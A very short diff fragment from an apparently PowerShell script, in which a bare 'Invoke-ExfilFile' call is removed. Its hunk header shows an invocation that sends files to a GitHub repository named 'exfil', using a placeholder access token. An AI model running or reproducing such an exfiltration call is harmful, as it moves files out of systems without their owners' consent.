@@ -156,7 +156,7 @@ Invoke-ExfilFile -GHUser nnh100 -GHRepo exfil -GHPAT "xxxxxxxxxxxxxxxxxxxxxxx" -
 
 }
 
-Invoke-ExfilFile
+
 
 
 
